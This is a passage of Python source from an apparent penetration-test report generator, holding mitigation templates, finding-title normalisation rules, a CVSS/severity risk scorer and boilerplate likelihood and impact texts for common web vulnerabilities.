            ("MDN Referrer-Policy", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"),
            ("OWASP Secure Headers", "https://owasp.org/www-project-secure-headers/"),
        ],
    },
    "Permissions-Policy": {
        "desc": (
            "The application does not set a Permissions-Policy (formerly Feature-Policy) header, which allows the server to "
            "control which browser features and APIs can be used by the page and any embedded frames. Without this header, "
            "any iframe embedded in the application (including those injected via XSS) can access powerful browser APIs such "
            "as the camera, microphone, geolocation, payment, and USB interfaces."
        ),
        "steps": [
            "Implement a Permissions-Policy header that disables all browser features not explicitly required by the application.",
            "Example: Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()",
            "Review the application's actual use of browser APIs and only permit those that are functionally required.",
        ],
        "refs": [
            ("MDN Permissions-Policy", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"),
            ("OWASP Secure Headers", "https://owasp.org/www-project-secure-headers/"),
        ],
    },
    "Version Disclosure": {
        "desc": (
            "External testing identified that the web server discloses its software version in HTTP response headers (e.g., "
            "the Server header). This information allows an attacker to identify the exact software version in use and cross-reference "
            "it against the National Vulnerability Database (NVD) and vendor security advisories to identify known vulnerabilities (CVEs) "
            "that affect that specific version.\n\n"
            "While version disclosure alone does not constitute a direct exploit, it provides concrete reconnaissance value that reduces "
            "the attacker's effort. An attacker who knows the exact server version can immediately focus on applicable exploits rather "
            "than blind testing, significantly increasing the efficiency and likelihood of a successful attack."
        ),
        "steps": [
            "Configure the web server to suppress version information in the Server response header (e.g., server_tokens off in Nginx, ServerTokens Prod in Apache).",
            "Remove or sanitise the X-Powered-By header if present.",
            "Implement an automated patch management system that covers all Internet-facing systems.",
            "Subscribe to security advisories from all software vendors in use and establish an emergency patching process for actively exploited vulnerabilities.",
            "Integrate vulnerability scanning into the CI/CD pipeline to prevent deployment of software with known vulnerabilities.",
        ],
        "refs": [
            ("OWASP Information Disclosure", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/"),
            ("CWE-200: Exposure of Sensitive Information", "https://cwe.mitre.org/data/definitions/200.html"),
        ],
    },
    "Server Version": {
        "desc": (
            "External testing identified that the web server discloses its software version in HTTP response headers. "
            "The Server header reveals the specific software and version number, allowing an attacker to identify known "
            "vulnerabilities (CVEs) and target exploits specific to that version.\n\n"
            "While version disclosure alone does not constitute a direct exploit, it significantly reduces attacker reconnaissance effort."
        ),
        "steps": [
            "Configure the web server to suppress version information (e.g., server_tokens off in Nginx, ServerTokens Prod in Apache).",
            "Remove or sanitise the X-Powered-By header if present.",
            "Implement automated vulnerability scanning and patching for all public-facing infrastructure.",
        ],
        "refs": [
            ("CWE-200: Information Exposure", "https://cwe.mitre.org/data/definitions/200.html"),
            ("OWASP Fingerprinting", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server"),
        ],
    },
    "INTERNAL_ENDPOINT": {
        "desc": (
            "During testing, multiple internal IP addresses, ports, and/or fully qualified internal domain names were identified "
            "hardcoded within publicly accessible JavaScript files. These values are embedded directly in the application's bundled "
            "JavaScript, exposing details of the internal network topology to any unauthenticated user who inspects the page source "
            "or downloaded assets.\n\n"
            "The exposure of these endpoints reveals significant detail about the organisation's internal infrastructure, including "
            "private RFC 1918 address ranges in active use, specific service ports and API routes, internal DNS naming conventions, "
            "and in some cases, the specific technologies deployed internally. This type of information disclosure provides an attacker "
            "with concrete knowledge of internal addressing schemes, service roles, and backend architecture that would otherwise only "
            "be discoverable after gaining internal network access."
        ),
        "steps": [
            "Replace all hardcoded internal addresses with relative paths or environment-driven configuration that resolves at runtime on the server side.",
            "Refactor the JavaScript to call relative API paths (e.g., /api/v2) and handle routing to internal services via a reverse proxy or API gateway.",
            "Ensure build pipelines and bundlers do not leak environment variables containing internal infrastructure details into client-side assets.",
            "Conduct a broader review of all JavaScript bundles, source maps, and configuration files for additional occurrences of internal addresses.",
            "Implement Content Security Policy headers to restrict the domains the application can communicate with.",
        ],
        "refs": [
            ("OWASP Information Gathering", "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/"),
            ("CWE-200: Exposure of Sensitive Information", "https://cwe.mitre.org/data/definitions/200.html"),
        ],
    },
    "DOM XSS": {
        "desc": (
            "During testing, potential DOM-based Cross-Site Scripting (DOM XSS) sinks were identified in the application's JavaScript. "
            "DOM XSS occurs when user-controllable data (sources) flows into dangerous JavaScript functions (sinks) without proper "
            "sanitisation. Unlike reflected or stored XSS, DOM XSS executes entirely in the browser and may not be visible in "
            "server-side logs or WAF inspection.\n\n"
            "Common sources include location.href, location.hash, document.referrer, and postMessage event data. Common sinks include "
            "innerHTML, document.write(), eval(), setTimeout(), and jQuery's .html() and .append() methods. When a source flows to a "
            "sink without sanitisation, an attacker can inject arbitrary JavaScript that executes in the user's browser context."
        ),
        "steps": [
            "Sanitise all user-controllable data before passing it to DOM manipulation functions.",
            "Use textContent or innerText instead of innerHTML when inserting text content into the DOM.",
            "Implement a strict Content Security Policy (CSP) that prevents inline script execution.",
            "Use DOMPurify or a similar sanitisation library for any HTML content that must be rendered from user input.",
            "Audit all JavaScript code for source-to-sink data flows and implement input validation at each entry point.",
        ],
        "refs": [
            ("OWASP DOM XSS Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"),
            ("CWE-79: Cross-site Scripting", "https://cwe.mitre.org/data/definitions/79.html"),
        ],
    },
}

# Fallback for types not in the map — will be overridden by _build_dynamic_desc()
_DEFAULT_MITIGATION = {
    "desc": "",  # empty — triggers dynamic description builder
    "steps": [
        "Review the proof of concept and affected endpoints.",
        "Implement appropriate input validation and access controls.",
        "Follow OWASP guidelines for the specific vulnerability type.",
        "Conduct a re-test after applying fixes to confirm remediation.",
    ],
    "refs": [("OWASP Top 10", "https://owasp.org/www-project-top-ten/")],
}


# ── Title normalisation ──────────────────────────────────────────────────────
# Raw tool output often has ugly titles like "JWT token is expired" or
# "JS: INTERNAL_ENDPOINT". This map + function turns them into professional
# pentest-report finding names.

import re as _re

# Exact substring → professional replacement (checked longest-first)
_TITLE_REWRITES: dict[str, str] = {
    # JWT issues
    "JWT token is expired":                     "Insecure JSON Web Token (JWT) Configuration: Expired Token Accepted",
    "JWT secret could be weak":                 "Weak JWT Signing Secret",
    "JWT secret could be weak - recommend testing with common secrets":
                                                "Weak JWT Signing Secret: Common Secret Suspected",
    # Internal endpoints / JS secrets
    "JS: INTERNAL_ENDPOINT":                    "Information Disclosure: Internal Endpoint in JavaScript",
    "JS Secret: INTERNAL_ENDPOINT":             "Information Disclosure: Internal Endpoint in JavaScript",
    # Raw tool confirmations
    "XSS CONFIRMED - payload reflected unescaped!": "Reflected Cross-Site Scripting (XSS)",
    "XSS CONFIRMED":                            "Reflected Cross-Site Scripting (XSS)",
    # robots / sitemap
    "Sensitive File Exposed: /robots.txt":      "Information Disclosure: robots.txt File Publicly Accessible",
    "Sensitive File Exposed: /sitemap.xml":      "Information Disclosure: sitemap.xml File Publicly Accessible",
    "Sensitive File Exposed: /package.json":     "Sensitive File Exposure: package.json Publicly Accessible",
    # API docs
    "API Documentation Exposed":                "Information Disclosure: API Documentation Publicly Accessible",
}

# Regex patterns → replacement template (use \1, \2, etc. for groups)
# IMPORTANT: Titles should be CLEAN vulnerability class names only.
# Technical details (params, fields, endpoints, methods) go in the description.
_TITLE_PATTERNS: list[tuple[str, str]] = [
    # "JS Secret: <type> in <filename>" → clean class name
    (r"(?i)^JS\s*Secret:\s*INTERNAL_ENDPOINT\s+in\s+.+$",
     r"Information Disclosure: Internal Endpoint in JavaScript"),
    (r"(?i)^JS\s*Secret:\s*API_KEY\s+in\s+.+$",
     r"Information Disclosure: API Key Exposed in JavaScript"),
    (r"(?i)^JS\s*Secret:\s*(\w+)\s+in\s+.+$",
     r"Information Disclosure: \1 Exposed in JavaScript"),
    # "SQL Injection (error-based) — target via POST" → just "SQL Injection"
    (r"(?i)^SQL Injection\s*\(?[^)]*\)?\s*[—–-]\s*.+$",
     r"SQL Injection"),
    (r"(?i)^SQL Injection\s*[—–-]\s*.+$",
     r"SQL Injection"),
    (r"(?i)^SQL Injection\s*\(.+\)$",
     r"SQL Injection"),
    # "Command Injection — tools target parameter" → just "Command Injection"
    (r"(?i)^Command Injection\s*[—–-]\s*.+$",
     r"Command Injection"),
    (r"(?i)^Command Injection\s*:?\s*\w+\s+.+$",
     r"Command Injection"),
    # "XSS — Reflected in search_param" → "Reflected Cross-Site Scripting (XSS)"
    (r"(?i)^XSS\s*[—–-]\s*Reflected\b.*$",
     r"Reflected Cross-Site Scripting (XSS)"),
    (r"(?i)^XSS\s*[—–-]\s*Stored\b.*$",
     r"Stored Cross-Site Scripting (XSS)"),
    (r"(?i)^XSS\s*[—–-]\s*DOM\b.*$",
     r"DOM-Based Cross-Site Scripting (XSS)"),
    (r"(?i)^XSS\s*[—–-]\s*.+$",
     r"Cross-Site Scripting (XSS)"),
    # "Reflected XSS in Forgot Password Form" → clean
    (r"(?i)^Reflected XSS\b.*$",
     r"Reflected Cross-Site Scripting (XSS)"),
    (r"(?i)^Stored XSS\b.*$",
     r"Stored Cross-Site Scripting (XSS)"),
    (r"(?i)^DOM XSS\b.*$",
     r"DOM-Based Cross-Site Scripting (XSS)"),
    # "IDOR — Horizontal Access via /api/users/123" → just category
    (r"(?i)^IDOR\s*[—–-]\s*(.+)$",
     r"Insecure Direct Object Reference (IDOR)"),
    # "SSRF — <details>" → clean
    (r"(?i)^SSRF\s*[—–-]\s*.+$",
     r"Server-Side Request Forgery (SSRF)"),
    # "SSTI — <details>" → clean
    (r"(?i)^SSTI\s*[—–-]\s*.+$",
     r"Server-Side Template Injection (SSTI)"),
    # "CSRF — <details>" → clean
    (r"(?i)^CSRF\s*[—–-]\s*.+$",
     r"Cross-Site Request Forgery (CSRF)"),
    # Missing Security Header — keep the header name (it's the category)
    (r"(?i)^Missing Security Header:\s*(.+)$",
     r"Missing HTTP Security Header: \1"),
    # Server Version Disclosure — keep the banner
    (r"(?i)^Server Version Disclosure:\s*(?:Server:\s*)?(.+)$",
     r"Server Version Disclosure"),
    # "Sensitive File Exposed: <path>" → clean
    (r"(?i)^Sensitive File Exposed:\s*(.+)$",
     r"Sensitive File Exposure"),
    # "Cookie Missing Secure Flag: refresh_token" → clean
    (r"(?i)^Cookie Missing\s+(Secure Flag|HttpOnly):\s*(.+)$",
     r"Cookie \1 Not Set"),
    # Strip trailing technical noise
    (r"(?i)\s*-\s*recommend\s+testing\s+with\s+.*$", ""),
    (r"(?i)\s+CONFIRMED\b", ""),
    # Strip "via POST", "via GET", "via <method>" from end
    (r"(?i)\s+via\s+(GET|POST|PUT|DELETE|PATCH)\s*$", ""),
    # Strip "(field=...)", "(param=...)" from end
    (r"\s*\([^)]*(?:field|param|target|endpoint|url)=[^)]*\)\s*$", ""),
    # Strip trailing " — <target> via <method>" patterns
    (r"(?i)\s*[—–-]\s*\S+\s+via\s+\w+\s*$", ""),
    # Strip trailing " — <anything with slashes>" (URL-like details)
    (r"(?i)\s*[—–-]\s*\S*/\S+.*$", ""),
]


def _normalize_title(raw_title: str) -> str:
    """Transform raw tool-output titles into professional finding names.

    Tries exact rewrites first (longest match), then regex patterns,
    then basic cleanup (strip noise, title-case short titles).
    """
    if not raw_title:
        return "Unknown Finding"

    t = raw_title.strip()

    # 1. Exact rewrites — longest key first so specific matches win
    for key in sorted(_TITLE_REWRITES, key=len, reverse=True):
        if key.lower() == t.lower():
            return _TITLE_REWRITES[key]

    # 2. Regex pattern rewrites
    for pattern, replacement in _TITLE_PATTERNS:
        new_t, n = _re.subn(pattern, replacement, t)
        if n > 0:
            t = new_t.strip()

    # 3. Basic cleanup
    # Remove leading "JS: " prefix if still present
    t = _re.sub(r"^JS:\s*", "JavaScript Issue: ", t)
    # Remove raw severity prefixes like "[HIGH]" or "[!]"
    t = _re.sub(r"^\[.*?\]\s*", "", t)
    # Remove trailing garbage like "!!!" or "..."
    t = _re.sub(r"[!.]{2,}$", "", t).strip()

    return t if t else "Unknown Finding"


def _build_dynamic_desc(title: str, url: str, sev: str, impact: str, owasp: str) -> str:
    """Build a proper multi-paragraph description when no template matches.

    Generates professional text from the finding's metadata instead of
    falling back to the generic one-liner.
    """
    paras = []

    # Opening paragraph — what was found
    paras.append(
        f"During testing, a {title} issue was identified affecting the target application"
        + (f" at {url}" if url and url != "—" else "")
        + ". This was confirmed through active testing with proof-of-concept evidence "
        "as documented in the Proof of Concept section below."
    )

    # Impact paragraph
    if impact:
        paras.append(
            f"The identified issue has the following impact: {impact}. "
            "Depending on the application context and the data it processes, "
            "the actual business impact may be higher than the technical severity alone suggests."
        )

    # Severity context
    sev_context = {
        "CRITICAL": (
            "This finding is rated as Critical, indicating that exploitation is straightforward, "
            "requires no or low privileges, and can lead to full compromise of the application or "
            "its underlying data. Immediate remediation is strongly recommended."
        ),
        "HIGH": (
            "This finding is rated as High severity, indicating significant risk to the application's "
            "security posture. Exploitation could lead to substantial data exposure, privilege escalation, "
            "or compromise of sensitive functionality. Remediation should be prioritised within days."
        ),
        "MEDIUM": (
            "This finding is rated as Medium severity. While exploitation may require specific conditions "
            "or may be limited in scope, it still represents a meaningful gap in the application's security "
            "controls that should be addressed within the next development cycle."
        ),
        "LOW": (
            "This finding is rated as Low severity. While the direct impact is limited, it may provide "
            "information or access that aids an attacker in chaining with other vulnerabilities for a "
            "more significant attack. Remediation is recommended as part of security hardening."
        ),
        "INFO": (
            "This is an informational finding that represents a deviation from security best practices. "
            "While there is no direct exploitable vulnerability, addressing it strengthens the overall "
            "security posture of the application."
        ),
    }
    paras.append(sev_context.get(sev, sev_context["MEDIUM"]))

    # OWASP classification
    if owasp and owasp != "—":
        paras.append(
            f"This finding falls under {owasp} in the OWASP Top 10 (2021) classification."
        )

    return "\n\n".join(paras)


def _get_mitigation(title: str) -> dict:
    """Get mitigation template based on finding title keywords.

    Prefers longer (more specific) keyword matches over shorter ones.
    E.g., 'Strict-Transport-Security' matches before 'Security Header'.
    """
    t = title.upper()
    # Sort by keyword length descending — longer = more specific
    for keyword, mit in sorted(MITIGATION_MAP.items(), key=lambda x: -len(x[0])):
        if keyword.upper() in t:
            return mit
    return _DEFAULT_MITIGATION


# ── ZDL Risk helpers ──────────────────────────────────────────────────────────

_ZDL_SEV_COLS = [1, 4, 9, 16, 25]

_ZDL_CVSS_TO_RISK = [
    (9.0, 10.0, 5, 4),
    (7.0,  8.9, 4, 3),
    (5.0,  6.9, 3, 2),
    (3.0,  4.9, 2, 1),
    (0.0,  2.9, 1, 1),
]

_ZDL_SEV_TO_RISK = {
    "CRITICAL": (5, 4),
    "HIGH":     (4, 3),
    "MEDIUM":   (3, 2),
    "LOW":      (2, 1),
    "INFO":     (1, 0),
}

_ZDL_RISK_LABEL = [
    (80,  "Critical"),
    (36,  "High"),
    (12,  "Medium"),
    (4,   "Low"),
    (0,   "Info"),
]


def _zdl_risk_for_pdf(title, severity, cvss_raw):
    """Compute ZDL risk: (likelihood, sev_col_idx, sev_col_val, risk_val, risk_label).

    Uses the MINIMUM of CVSS-derived risk and severity-derived risk so
    that the agent's severity classification acts as an upper bound.
    A LOW-severity finding can never get a ZDL "High" risk score.
    """
    import re as _re
    sev = severity.upper()
    cvss_float = None
    try:
        cvss_float = float(_re.sub(r'[^0-9.]', '', str(cvss_raw).split()[0]))
    except Exception:
        pass

    # Risk from severity label (always available)
    sev_lkl, sev_idx = _ZDL_SEV_TO_RISK.get(sev, (1, 0))

    if cvss_float is not None:
        # Risk from CVSS score
        cvss_lkl, cvss_idx = 1, 0
        for lo, hi, l2, s2 in _ZDL_CVSS_TO_RISK:
            if lo <= cvss_float <= hi:
                cvss_lkl, cvss_idx = l2, s2
                break
        # Take the MINIMUM — severity caps the CVSS-derived risk
        lkl = min(cvss_lkl, sev_lkl)
        sc_idx = min(cvss_idx, sev_idx)
    else:
        lkl, sc_idx = sev_lkl, sev_idx

    sc_val = _ZDL_SEV_COLS[sc_idx]
    risk_val = lkl * sc_val
    label = "Info"
    for threshold, lbl in _ZDL_RISK_LABEL:
        if risk_val >= threshold:
            label = lbl
            break
    return lkl, sc_idx, sc_val, risk_val, label


_ZDL_LIKELIHOOD_TEXTS = {
    "SQL Injection": (
        "The likelihood of SQL injection being exploited is rated as Critical. "
        "SQL injection vulnerabilities are well-understood and have numerous freely available automated tools "
        "(e.g., sqlmap) that can extract the entire database without manual effort. "
        "Exploitation requires no authentication for unauthenticated endpoints."
    ),
    "SQLi": (
        "The likelihood of SQL injection being exploited is rated as Critical. "
        "SQL injection vulnerabilities are well-understood and can be exploited with freely available automated tools. "
        "Any attacker with network access to the endpoint can attempt exploitation."
    ),
    "XSS": (
        "The likelihood of cross-site scripting being exploited is rated as High. "
        "XSS payloads can be delivered via crafted links, form submissions, or stored content. "
        "Exploitation requires the attacker to direct a victim to the injected page, which is achievable "
        "through phishing or by storing the payload in a location other authenticated users visit."
    ),
    "SSRF": (
        "The likelihood of SSRF exploitation is rated as High. "
        "The vulnerability can be exploited by any user who can control the URL or fetch parameter. "
        "No special privileges are required, and the technique is well-documented with publicly available tools."
    ),
    "IDOR": (
        "The likelihood of IDOR exploitation is rated as High. "
        "Any authenticated user can manipulate object identifiers to access other users' data. "
        "The technique requires no special skills or tooling — simple manual URL modification suffices."
    ),
    "SSTI": (
        "The likelihood of server-side template injection being exploited is rated as High. "
        "SSTI is well-documented and template-specific payloads are publicly available. "
        "Exploitation can lead directly to remote code execution with a single crafted request."
    ),
    "CSRF": (
        "The likelihood of CSRF exploitation is rated as Moderate. "
        "An attacker must craft a malicious page that triggers the target action and persuade "
        "an authenticated victim to visit it. Social engineering is required, reducing the likelihood."
    ),
    "CORS": (
        "The likelihood of CORS misconfiguration exploitation is rated as Moderate. "
        "An attacker must host a malicious site at an allowed origin and persuade an authenticated "
        "victim to visit it. The exploit is straightforward once a victim visits the attacker-controlled page."
    ),
    "HSTS": (
        "The likelihood that an attacker will exploit this weakness is rated as Low. "
        "Exploitation requires the attacker to be in a network position to intercept and downgrade "
        "the connection before the browser has cached the HSTS policy (e.g., a compromised router). "
        "The attack must also be carried out while the victim is actively using the application."
    ),
    "Security Header": (
        "The likelihood of security header misconfigurations being actively exploited is rated as Low to Medium. "
        "These findings represent defence-in-depth gaps. An attacker must chain them with another vulnerability "
        "to achieve meaningful exploitation."
    ),
    "Version": (
        "The likelihood that an attacker will actively exploit specific version disclosures is rated as Low. "
        "While the version information itself does not grant access, it enables targeted CVE research "
        "and reduces the attacker's reconnaissance effort for subsequent attacks."
    ),
    "Disclosure": (
        "The likelihood of this information disclosure being exploited is rated as High. "
        "The exposed information is accessible to any unauthenticated user who inspects the application's "
        "responses, source, or downloadable assets. No special privileges or tooling are required."
    ),
    "JWT": (
        "The likelihood of JWT-related vulnerabilities being exploited is rated as High. "
        "JWT attacks are well-documented and automated tools exist. "
        "A single malformed or unsigned token may allow complete authentication bypass."
    ),
    "File Upload": (
        "The likelihood of file upload exploitation is rated as High. "
        "Any authenticated user with upload permissions can attempt to upload malicious files. "
        "Successful exploitation of unrestricted upload can lead to webshell deployment."
    ),
    "Command Injection": (
        "The likelihood of command injection being exploited is rated as Critical. "
        "Arbitrary OS command execution can be achieved with a single crafted request. "
        "No authentication is required if the endpoint is publicly accessible."
    ),
    "Open Redirect": (
        "The likelihood of open redirect exploitation is rated as Medium. "
        "Open redirects require user interaction but are commonly used in phishing campaigns "
        "to lend legitimacy to malicious URLs."
    ),
    "Path Traversal": (
        "The likelihood of path traversal exploitation is rated as High. "
        "Directory traversal attacks can be performed manually without specialised tooling. "
        "An attacker can systematically enumerate sensitive files using crafted requests."
    ),
    "Secret": (
        "The likelihood of hardcoded secret exploitation is rated as High. "
        "The credentials are directly accessible to any user who can read the exposed file or response. "
        "Exploitation requires no interaction from a victim and can be automated."
    ),
    "Hardcoded": (
        "The likelihood of hardcoded secret exploitation is rated as High. "
        "The credentials or keys are directly accessible to any user who can read the exposed file. "
        "Once obtained, they can be used immediately without further exploitation steps."
    ),
    "Rate Limit": (
        "The likelihood of rate limit exploitation is rated as High. "
        "The absence of rate limiting allows automated attacks (credential stuffing, brute force, "
        "enumeration) to proceed at machine speed without any throttling or blocking."
    ),
    "Default Cred": (
        "The likelihood of default credential exploitation is rated as Critical. "
        "Default credentials are publicly known and first-tried by automated scanners. "
        "No special skill is required — a simple login attempt suffices."
    ),
    "Secure Flag": (
        "The likelihood of this cookie flag issue being exploited is rated as Low to Medium. "
        "Exploitation requires the attacker to be in a network position to intercept HTTP traffic "
        "(e.g., via ARP spoofing on a shared WiFi network, a compromised router, or ISP-level interception). "
        "The attack must be carried out while the victim is actively using the application."
    ),
    "HttpOnly": (
        "The likelihood of this cookie flag issue being exploited is rated as Medium. "
        "The HttpOnly flag is a defence-in-depth measure — exploitation requires the attacker to first "
        "find and exploit a separate XSS vulnerability in the application. However, once XSS is achieved, "
        "cookie theft is trivial and automatable. The risk increases if any XSS exists in the application."
    ),
    "INTERNAL_ENDPOINT": (
        "The likelihood of this information disclosure being exploited is rated as High. "
        "Any unauthenticated user can retrieve the exposed internal endpoints by inspecting the publicly "
        "accessible JavaScript file — no special tooling or elevated privileges are required beyond network "
        "access. The information is static, persistent, and requires zero interaction from a victim."
    ),
    "DOM XSS": (
        "The likelihood of DOM XSS exploitation depends on the specific source-to-sink data flow. "
        "If a user-controllable source (e.g., location.hash, postMessage) flows to a dangerous sink "
        "(e.g., innerHTML, eval) without sanitisation, exploitation is straightforward. DOM XSS payloads "
        "can be delivered via crafted URLs that the attacker distributes through phishing."
    ),
    "X-Frame-Options": (
        "The likelihood of clickjacking exploitation is rated as Medium. "
        "An attacker must create a malicious page that frames the target and distribute it to victims. "
        "The attack requires user interaction (the victim must visit the attacker's page and click), "
        "but the technique is well-documented and straightforward to implement."
    ),
    "X-Content-Type-Options": (
        "The likelihood of MIME sniffing exploitation is rated as Low. "
        "Exploitation requires specific conditions: user-uploaded content or API responses where an attacker "
        "can inject content that the browser interprets as a different type."
    ),
    "Content-Security-Policy": (
        "The likelihood of exploitation in the absence of CSP is rated as Medium. "
        "CSP is a defence-in-depth measure. Its absence does not create a vulnerability directly, "
        "but it removes a critical safety net against XSS. If any XSS vulnerability is present, "
        "a strict CSP would have blocked or limited the attack; without it, exploitation is unrestricted."
    ),
    "Referrer-Policy": (
        "The likelihood of referrer leakage being exploited is rated as Low. "
        "Exploitation requires sensitive data to be present in URL parameters and the user to navigate to an external site."
    ),
    "Permissions-Policy": (
        "The likelihood of this missing header being directly exploited is rated as Low. "
        "The absence of Permissions-Policy is primarily a defence-in-depth gap."
    ),
    "Server Version": (
        "The likelihood that version information will be used in an attack is rated as Medium. "
        "Server version disclosure is a standard reconnaissance step. Automated scanners and manual attackers "
        "routinely check for version banners and cross-reference against CVE databases."
    ),
    "Version": (
        "The likelihood that version information will be used in an attack is rated as Medium. "
        "Server version disclosure is a standard reconnaissance step. Automated scanners routinely check "
        "for version banners and cross-reference them against known CVE databases."
    ),
}

_ZDL_SEVERITY_TEXTS = {
    "SQL Injection": (
        "SQL injection allows an attacker to read, modify, or delete all data in the database. "
        "Depending on the database configuration, it may also allow file system access and "
        "operating system command execution. A full database compromise may expose PII, "
        "credentials, and business-critical data."
    ),
    "SQLi": (
        "SQL injection allows an attacker to read, modify, or delete all data in the database. "
        "Depending on the database configuration, it may also allow file system access and "
        "operating system command execution. A full database compromise may expose PII, credentials, "
        "and business-critical data."
    ),
    "XSS": (
        "Cross-site scripting allows an attacker to execute arbitrary JavaScript in the victim's browser context. "
        "This enables session hijacking via cookie theft, credential phishing via fake login overlays, "
        "keylogging, browser-side data exfiltration, and in some contexts, browser exploitation. "
        "The impact is highest when the XSS payload executes in an authenticated session."
    ),
    "SSRF": (
        "SSRF allows an attacker to make the server send arbitrary HTTP requests to internal services. "
        "This can expose cloud metadata endpoints (e.g., AWS EC2 IAM credentials), "
        "internal APIs, database administration interfaces, and services not otherwise reachable from the internet. "
        "In cloud environments, SSRF frequently leads to full cloud account compromise."
    ),
    "IDOR": (
        "IDOR allows an attacker to access or modify other users' data by manipulating object identifiers. "
        "Depending on the affected endpoint, this may expose personal data, financial records, or "
        "enable horizontal privilege escalation — accessing any user account by ID."
    ),
    "SSTI": (
        "Server-side template injection enables remote code execution on the server. "
        "An attacker can execute arbitrary operating system commands, read sensitive files, "
        "exfiltrate environment variables (including secrets and API keys), and establish persistent access."
    ),
    "CSRF": (
        "CSRF allows an attacker to perform state-changing actions on behalf of an authenticated victim "
        "without their knowledge. This can result in account takeover, data modification, "
        "unauthorised transactions, or configuration changes performed silently."
    ),
    "CORS": (
        "A permissive CORS policy allows attacker-controlled origins to make authenticated cross-origin "
        "requests and read the response body. This can expose sensitive API responses including "
        "personal data, session tokens, and internal application state."
    ),
    "HSTS": (
        "Without HSTS, an attacker in a privileged network position can intercept and read plaintext "
        "HTTP traffic that should be served over HTTPS. Session tokens, credentials, and sensitive data "
        "transmitted during the protocol downgrade window are exposed in cleartext."
    ),
    "Security Header": (
        "Missing security headers reduce the defence-in-depth posture of the application. "
        "Depending on the specific header, the impact includes increased exposure to clickjacking attacks, "
        "MIME-type confusion, cross-site scripting, protocol downgrade, and cache poisoning."
    ),
    "Version": (
        "Disclosure of server software version information enables an attacker to identify specific CVEs "
        "applicable to the installed version. While this finding alone does not represent direct exploitation, "
        "it provides concrete reconnaissance value and reduces the attacker's effort for subsequent attacks."
    ),
    "Disclosure": (
        "Information disclosure exposes internal implementation details that reduce the attacker's "
        "reconnaissance effort. Depending on the disclosed information, this may reveal internal IP addresses, "
        "API endpoints, software versions, file paths, or credentials that directly aid further attacks."
    ),
    "JWT": (
        "JWT vulnerabilities may allow an attacker to forge authentication tokens and impersonate any user, "
        "including administrative accounts. This leads to complete authentication bypass and full account takeover."
    ),
    "File Upload": (
        "Unrestricted file upload allows an attacker to upload and execute arbitrary server-side code "
        "(webshell). Once a webshell is deployed, the attacker achieves remote code execution with the "
        "privileges of the web server process."
    ),
    "Command Injection": (
        "Command injection allows an attacker to execute arbitrary operating system commands on the server "
        "with the privileges of the web application process. This can lead to full server compromise, "
        "data exfiltration, lateral movement, and persistent backdoor installation."
    ),
    "Open Redirect": (
        "Open redirect allows an attacker to craft trusted-looking URLs that redirect to malicious sites. "
        "This is commonly used in phishing campaigns and can lead to credential theft when combined "
        "with a convincing fake login page."
    ),
    "Secret": (
        "Exposed secrets (API keys, credentials, tokens) provide an attacker with direct authenticated "
        "access to the associated services. Depending on the service, this can lead to data exfiltration, "
        "service abuse, financial impact, or lateral movement into cloud infrastructure."
    ),
    "Hardcoded": (
        "Hardcoded credentials or API keys in accessible files provide an attacker with direct authenticated "
        "access to the associated services. The impact depends on the privileges granted by the exposed key "
        "or credential, ranging from read access to full administrative control."
    ),
    "Rate Limit": (
        "The absence of rate limiting enables automated brute-force, credential stuffing, and enumeration "
        "attacks to proceed at machine speed. This dramatically reduces the time required for an attacker "
        "to compromise user accounts or enumerate valid data."
    ),
    "Default Cred": (
        "Default credentials provide complete, authenticated access to the application. "
        "An attacker gains the same access as the account owner, which may include administrative privileges, "
        "full data access, and the ability to reconfigure or compromise the application."
    ),
    "Secure Flag": (
        "Without the Secure flag, cookies containing session tokens or authentication credentials are transmitted "
        "over unencrypted HTTP connections. An attacker performing a man-in-the-middle attack can capture these "
        "cookies in plaintext, leading to session hijacking and full account takeover. The severity is increased "
        "when the affected cookies are authentication tokens (access_token, refresh_token) that grant persistent access."
    ),
    "HttpOnly": (
        "Without the HttpOnly flag, cookies are accessible to client-side JavaScript via document.cookie. "
        "If an attacker exploits any XSS vulnerability in the application, they can trivially exfiltrate the cookie "
        "value and hijack the victim's session. For authentication tokens (access_token, refresh_token), this "
        "directly enables complete account takeover."
    ),
    "INTERNAL_ENDPOINT": (
        "Exposure of internal IP addresses, ports, and fully qualified internal hostnames within a client-facing "
        "JavaScript file directly reduces the attack surface obscurity of backend infrastructure. While this finding "
        "does not constitute direct exploitation, it provides an attacker with confirmed knowledge of live internal "
        "services, their ports, and the architecture running behind them. In combination with other vulnerabilities "
        "— particularly SSRF — these endpoints could be targeted directly."
    ),
    "DOM XSS": (
        "DOM-based XSS allows an attacker to execute arbitrary JavaScript in the victim's browser context. "
        "This enables session hijacking, credential theft via fake login overlays, keylogging, and data exfiltration. "
        "DOM XSS executes entirely client-side and may bypass server-side security controls including WAFs."
    ),
    "X-Frame-Options": (
        "Without clickjacking protection, an attacker can frame the application and trick users into performing "
        "unintended actions. This can lead to account settings changes, unauthorised transactions, OAuth permission "
        "grants, or any action the user can perform while authenticated."
    ),
    "X-Content-Type-Options": (
        "Without X-Content-Type-Options: nosniff, browsers may interpret uploaded files or API responses as "
        "executable content (HTML/JavaScript), enabling XSS through content-type confusion."
    ),
    "Content-Security-Policy": (
        "Without CSP, the application has no browser-enforced restriction on script sources. Any XSS vulnerability "
        "can execute arbitrary inline scripts, load remote JavaScript from attacker-controlled servers, and exfiltrate "
        "data without restriction. CSP is the primary browser-side defence against XSS."
    ),
    "Referrer-Policy": (
        "Without a restrictive referrer policy, sensitive URL parameters (tokens, session IDs, internal paths) may be "
        "leaked to external sites via the Referer header."
    ),
    "Permissions-Policy": (
        "Without Permissions-Policy, any iframe (including those injected via XSS) can access powerful browser APIs "
        "such as the camera, microphone, geolocation, and payment interfaces."
    ),
    "Server Version": (
        "Disclosure of server software version information enables an attacker to identify specific CVEs applicable "
        "to the installed version. While this finding alone does not represent direct exploitation, it provides concrete "
        "reconnaissance value and reduces the attacker's effort for subsequent attacks. When the disclosed version has "
